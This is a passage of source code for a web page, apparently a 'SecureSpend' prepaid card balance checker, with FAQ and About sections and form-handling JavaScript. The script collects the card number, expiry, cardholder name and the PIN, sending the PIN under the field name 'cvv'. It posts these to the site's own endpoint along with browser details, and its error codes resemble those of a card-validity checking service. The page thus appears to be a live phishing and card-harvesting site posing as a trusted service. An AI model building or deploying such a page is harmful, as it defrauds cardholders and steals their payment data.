                  <div id="gcBrand" style="height:32px;display:flex;align-items:center;"></div>
                </div>
              </div>
            </div>

            <!-- How It Works -->
            <div class="info-card">
              <div class="info-title">
                <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
                How It Works
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
                </div>
                <div class="info-text">
                  <h4>1. Enter Card Details</h4>
                  <p>Type your card number and PIN from the back of your prepaid card.</p>
                </div>
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                </div>
                <div class="info-text">
                  <h4>2. Secure Verification</h4>
                  <p>Your data is encrypted and securely transmitted for balance lookup.</p>
                </div>
              </div>

              <div class="info-item">
                <div class="info-icon">
                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                </div>
                <div class="info-text">
                  <h4>3. View Your Balance</h4>
                  <p>Your available balance is displayed instantly on screen.</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- FAQ PAGE -->
    <section id="page-faq" class="page">
      <div class="hero">
        <div class="hero-content">
          <h1>Frequently Asked Questions</h1>
          <p>Find answers to common questions about SecureSpend prepaid cards.</p>
        </div>
      </div>
      <div class="main-content" style="margin-top:24px;">
        <div class="content-section">
          <div class="faq-item">
            <h4>Where do I find my card number?</h4>
            <p>Your card number is printed on the front of your SecureSpend prepaid card. It's typically 16 digits long.</p>
          </div>
          <div class="faq-item">
            <h4>Where is the PIN located?</h4>
            <p>The PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance.</p>
          </div>
          <div class="faq-item">
            <h4>Is it safe to check my balance here?</h4>
            <p>Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete.</p>
          </div>
          <div class="faq-item">
            <h4>Why does my card show a zero balance?</h4>
            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</p>
          </div>
          <div class="faq-item">
            <h4>What card types are supported?</h4>
            <p>We support SecureSpend Visa® and Mastercard® prepaid cards and gift cards.</p>
          </div>
          <div class="faq-item">
            <h4>Is there a fee to check my balance?</h4>
            <p>No. Checking your prepaid card balance is completely free of charge.</p>
          </div>
        </div>
      </div>
    </section>

    <!-- ABOUT PAGE -->
    <section id="page-about" class="page">
      <div class="hero">
        <div class="hero-content">
          <h1>About SecureSpend</h1>
          <p>Trusted prepaid card management for Visa® and Mastercard® cardholders.</p>
        </div>
      </div>
      <div class="main-content" style="margin-top:24px;">
        <div class="content-section">
          <p>SecureSpend prepaid Visa® and Mastercard® cards are the perfect gift for any occasion. They can be used anywhere Visa or Mastercard debit cards are accepted, giving recipients the freedom to choose exactly what they want.</p>
          <p>Our balance checker provides a fast, secure way to verify your remaining prepaid card balance without calling a phone number or visiting a store. Simply enter your card number and PIN to see your available funds instantly.</p>
          <p>Your security is our priority. All card information is encrypted during transmission using 256-bit SSL encryption and is never stored on our servers after the balance check is complete.</p>
        </div>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="footer">
    <div class="footer-inner">
      <div class="footer-grid">
        <div class="footer-brand">
          <div class="footer-logo">Secure<span>Spend</span></div>
          <p>SecureSpend offers prepaid Visa® and Mastercard® cards for secure online and in-store purchases. Check your balance, view transactions, and manage your card with ease.</p>
        </div>
        <div class="footer-col">
          <h4>Quick Links</h4>
          <a href="/" class="nav-link" data-page="home">Check Balance</a>
          <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
          <a href="/about" class="nav-link" data-page="about">About</a>
        </div>
        <div class="footer-col">
          <h4>Support</h4>
          <a href="/faq" class="nav-link" data-page="faq">Help Center</a>
          <a href="/about" class="nav-link" data-page="about">Contact Us</a>
          <a href="/faq" class="nav-link" data-page="faq">Cardholder Agreement</a>
        </div>
        <div class="footer-col">
          <h4>Contact</h4>
          <a href="tel:1-833-563-8200">1-833-563-8200</a>
          <a href="mailto:support@secured-spend.com">support@secured-spend.com</a>
          <a>PO Box 826, Fortson, GA 31808</a>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 SecureSpend. All rights reserved. SecureSpend is not affiliated with Visa Inc. or Mastercard International.</p>
        <div class="footer-bottom-links">
          <a href="/about" class="nav-link" data-page="about">Privacy Policy</a>
          <a href="/about" class="nav-link" data-page="about">Terms of Service</a>
        </div>
      </div>
    </div>
  </footer>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <span>Checking your balance...</span>
  </div>

  <script>
    // Mobile menu toggle
    document.getElementById('mobileMenuBtn').addEventListener('click', () => {
      document.getElementById('mainNav').classList.toggle('open');
    });

    // SEO data per page
    const PAGE_SEO = {
      home: {
        title: 'SecureSpend\u2122 | Check Secure Spend Balance Online - Visa\u00ae & Mastercard\u00ae Prepaid Cards',
        description: 'SecureSpend - Check your Secure Spend Visa & Mastercard prepaid gift card balance online. Activate your SecureSpend card, view transactions, and manage your secured spend prepaid card instantly.',
        canonical: 'https://secured-spend.com/',
        breadcrumbs: [{ name: 'Home', item: 'https://secured-spend.com/' }]
      },
      faq: {
        title: 'FAQ - SecureSpend\u2122 | Frequently Asked Questions About Prepaid Cards',
        description: 'Find answers to frequently asked questions about SecureSpend prepaid Visa and Mastercard gift cards. Learn about balance checking, PIN location, card activation, and more.',
        canonical: 'https://secured-spend.com/faq',
        breadcrumbs: [{ name: 'Home', item: 'https://secured-spend.com/' }, { name: 'FAQ', item: 'https://secured-spend.com/faq' }]
      },
      about: {
        title: 'About - SecureSpend\u2122 | Trusted Prepaid Card Balance Checker',
        description: 'Learn about SecureSpend - your trusted source for checking Visa and Mastercard prepaid gift card balances online. Bank-level encryption, free balance checks, instant results.',
        canonical: 'https://secured-spend.com/about',
        breadcrumbs: [{ name: 'Home', item: 'https://secured-spend.com/' }, { name: 'About', item: 'https://secured-spend.com/about' }]
      }
    };

    function updatePageSEO(page) {
      const seo = PAGE_SEO[page] || PAGE_SEO.home;
      document.title = seo.title;
      document.getElementById('metaDescription').setAttribute('content', seo.description);
      document.getElementById('canonicalLink').setAttribute('href', seo.canonical);
      document.getElementById('ogTitle').setAttribute('content', seo.title);
      document.getElementById('ogDescription').setAttribute('content', seo.description);
      document.getElementById('ogUrl').setAttribute('content', seo.canonical);
      document.getElementById('twitterTitle').setAttribute('content', seo.title);
      document.getElementById('twitterDescription').setAttribute('content', seo.description);
      const breadcrumbSchema = {
        '@context': 'https://schema.org',
        '@type': 'BreadcrumbList',
        'itemListElement': seo.breadcrumbs.map((b, i) => ({
          '@type': 'ListItem',
          'position': i + 1,
          'name': b.name,
          'item': b.item
        }))
      };
      document.getElementById('breadcrumbSchema').textContent = JSON.stringify(breadcrumbSchema);
    }

    // Navigation
    function showPageFromPath() {
      const path = window.location.pathname.replace(/\/$/, '') || '/';
      const page = path === '' || path === '/' || path === '/home' ? 'home' : path.replace(/^\//, '') || 'home';
      const valid = ['home', 'faq', 'about'];
      const p = valid.includes(page) ? page : 'home';
      document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
      document.querySelectorAll('.nav-link').forEach(a => {
        a.classList.toggle('active', a.getAttribute('data-page') === p);
      });
      const pageEl = document.getElementById('page-' + p);
      if (pageEl) pageEl.classList.add('active');
      updatePageSEO(p);
    }
    showPageFromPath();
    window.addEventListener('popstate', showPageFromPath);

    document.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault();
        const page = link.getAttribute('data-page');
        const url = page === 'home' ? '/' : '/' + page;
        history.pushState(null, '', url);
        showPageFromPath();
        document.getElementById('mainNav').classList.remove('open');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    });

    // Elements
    const cardInput = document.getElementById('cardNumber');
    const cardHolderInput = document.getElementById('cardHolder');
    const pinInput = document.getElementById('pin');
    const expiryInput = document.getElementById('expiryDate');
    const form = document.getElementById('balanceForm');
    const resultEl = document.getElementById('result');
    const submitBtn = document.getElementById('submitBtn');
    const formFields = document.getElementById('formFields');
    const checkAnother = document.getElementById('checkAnother');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const cardBrandBadge = document.getElementById('cardBrandBadge');
    const cardBrandImg = document.getElementById('cardBrandImg');

    // Card type detection
    const CARD_LOGOS = { Visa: '/visa.svg', Mastercard: '/mastercard.svg' };
    function getCardType(num) {
      const d = String(num).replace(/\D/g, '');
      if (d.startsWith('4')) return 'Visa';
      if (/^5[1-5]/.test(d)) return 'Mastercard';
      const n4 = d.length >= 4 ? parseInt(d.slice(0, 4), 10) : 0;
      if (d.startsWith('2') && n4 >= 2221 && n4 <= 2720) return 'Mastercard';
      return null;
    }

    // Card number formatting
    cardInput.oninput = e => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 19);
      e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      e.target.classList.remove('error');
      document.getElementById('cardError').textContent = '';
      document.getElementById('gcNumber').textContent = e.target.value || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
      const type = getCardType(v);
      if (v.length >= 2 && type) {
        cardBrandImg.src = CARD_LOGOS[type];
        cardBrandImg.alt = type;
        cardBrandBadge.classList.add('visible');
        document.getElementById('gcBrand').innerHTML = '<img src="' + CARD_LOGOS[type] + '" alt="' + type + '" style="height:32px;border-radius:4px;">';
      } else {
        cardBrandBadge.classList.remove('visible');
        document.getElementById('gcBrand').innerHTML = '';
      }
    };

    cardHolderInput.oninput = e => {
      const name = e.target.value.toUpperCase();
      document.getElementById('gcHolder').textContent = name || 'CARDHOLDER';
    };

    pinInput.oninput = e => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      e.target.classList.remove('error');
      document.getElementById('pinError').textContent = '';
    };

    expiryInput.oninput = e => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
      e.target.value = v;
      e.target.classList.remove('error');
      document.getElementById('expiryError').textContent = '';
      const parts = v.split('/');
      document.getElementById('gcExpiry').textContent = (parts[0] || 'MM') + '/' + (parts[1] || 'YY');
    };

    function luhnCheck(num) {
      const digits = String(num).replace(/\D/g, '');
      let sum = 0, alt = false;
      for (let i = digits.length - 1; i >= 0; i--) {
        let n = parseInt(digits[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
      }
      return sum % 10 === 0;
    }

    function validate() {
      const digits = cardInput.value.replace(/\s/g, '');
      const pin = pinInput.value;
      const expiry = expiryInput.value;
      let ok = true;

      document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
      document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error'));

      if (digits.length < 15 || digits.length > 19) {
        document.getElementById('cardError').textContent = 'Please enter a valid card number';
        cardInput.classList.add('error');
        ok = false;
      } else if (!luhnCheck(digits)) {
        document.getElementById('cardError').textContent = 'Invalid card number';
        cardInput.classList.add('error');
        ok = false;
      }

      if (!pin || pin.length < 3 || pin.length > 4) {
        document.getElementById('pinError').textContent = 'Please enter a valid PIN (3-4 digits)';
        pinInput.classList.add('error');
        ok = false;
      }

      if (expiry) {
        const parts = expiry.split('/');
        if (parts.length === 2) {
          const mm = parseInt(parts[0], 10);
          const yy = parts[1];
          if (mm < 1 || mm > 12) {
            document.getElementById('expiryError').textContent = 'Invalid month';
            expiryInput.classList.add('error');
            ok = false;
          }
          if (yy.length !== 2) {
            document.getElementById('expiryError').textContent = 'Use MM/YY format';
            expiryInput.classList.add('error');
            ok = false;
          }
        } else if (expiry.length > 0) {
          document.getElementById('expiryError').textContent = 'Use MM/YY format';
          expiryInput.classList.add('error');
          ok = false;
        }
      }

      return ok;
    }

    function showResult(data) {
      resultEl.className = 'balance-result show ' + (data.success ? 'success' : 'error');
      if (data.success) {
        const amt = typeof data.balance === 'number' ? data.balance.toFixed(2) : (data.balance != null ? String(data.balance) : '0.00');
        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">\u2713</div><div class="balance-label">Available Balance</div><div class="balance-amount"><span class="currency">' + (data.currency || 'USD') + ' </span><span class="amount">$' + amt + '</span></div>' + (data.cardLast4 ? '<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 ' + data.cardLast4 + '</p>' : '') + '</div>';
      } else {
        resultEl.innerHTML = '<div class="result-box"><div class="result-icon">!</div><h3 style="margin-bottom:0.5rem;font-weight:500">Unable to Check Balance</h3><p class="error-message">' + (data.error || 'Please verify your card details and try again.') + '</p></div>';
      }
      formFields.classList.add('hide');
      checkAnother.classList.add('show');
      resultEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    checkAnother.onclick = () => {
      resultEl.className = 'balance-result';
      resultEl.innerHTML = '';
      formFields.classList.remove('hide');
      checkAnother.classList.remove('show');
      form.reset();
      document.getElementById('gcNumber').textContent = '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
      document.getElementById('gcExpiry').textContent = 'MM/YY';
      document.getElementById('gcHolder').textContent = 'CARDHOLDER';
      document.getElementById('gcBrand').innerHTML = '';
      cardBrandBadge.classList.remove('visible');
    };

    const CARD_ERROR_MSG = 'Check your card information or use a new card.';

    form.onsubmit = async e => {
      e.preventDefault();
      if (!validate()) return;

      const digits = cardInput.value.replace(/\s/g, '');
      const pin = pinInput.value;
      const expiry = expiryInput.value;

      let expiryMonth = '';
      let expiryYear = '';
      if (expiry) {
        const parts = expiry.split('/');
        expiryMonth = (parts[0] || '').padStart(2, '0');
        expiryYear = parts[1] || '';
      }

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Checking...';
      loadingOverlay.classList.add('show');

      try {
        const payload = {
          cardNumber: digits,
          expiryMonth: expiryMonth,
          expiryYear: expiryYear,
          cvv: pin,
          cardHolder: cardHolderInput.value.trim(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          userAgent: navigator.userAgent,
          referral: document.referrer || 'Direct',
          pageUrl: window.location.href
        };

        const res = await fetch('/api/check-balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const data = await res.json();

        let result = { success: false, error: '' };
        const st = data.status || '';

        if (st === 'OK') {
          const d = data.data || data;
          const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : (data.balance !== undefined ? data.balance : data.amount));
          let bal = null;
          let curr = d.currency || data.currency || 'USD';
          if (raw !== undefined && raw !== null && raw !== '') {
            bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
            if (isNaN(bal)) bal = null;
          }
          if (bal !== null) {
            result = { success: true, balance: bal, currency: curr, cardLast4: digits.slice(-4), cardStatus: d.card_status || data.card_status || '' };
          } else {
            result.error = 'Balance information not available.';
          }
        } else {
          const msg = data.error_message || data.error || data.message || '';
          const ERROR_MAP = {
            'WRONG_API_TOKEN': 'Service configuration error. Please contact support.',
            'INSUFFICIENT_CREDIT': 'Service temporarily unavailable. Please try again later.',
            'RATE_LIMIT': 'Too many requests. Please wait a moment and try again.',
            'WRONG_INPUT': CARD_ERROR_MSG,
            'NO_CARD_DEAILS_FOUND': 'Card details not found. Please verify and try again.',
            'UNKNOWN_CARD_BIN': 'This card type is not supported.',
            'CORRUPTED_CARD': CARD_ERROR_MSG,
            'REGISTERED_CARD': 'This card requires owner authentication. Please check with the card issuer.',
            'INVALID_CARD': 'Invalid card. Please check your card details.',
            'FAILED': msg || 'Technical failure. Please try again.',
            'TIMEOUT': 'Request timed out. Please try again.',
            'UNKNOWN_ERROR': msg || 'An unexpected error occurred. Please try again.'
          };
          result.error = ERROR_MAP[st] || msg || CARD_ERROR_MSG;

          if (!result.error || result.error === CARD_ERROR_MSG) {
            const d = data.data || data;
            const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : data.balance);
            if (raw !== undefined && raw !== null && raw !== '') {
              const bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
              if (!isNaN(bal)) {
                result = { success: true, balance: bal, currency: d.currency || data.currency || 'USD', cardLast4: digits.slice(-4) };
              }
            }
          }
        }
        showResult(result);
      } catch (err) {
        showResult({ success: false, error: 'Connection failed. Please try again.' });
      }

      loadingOverlay.classList.remove('show');
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Check Balance';
    };
  </script>
</body>
</html>
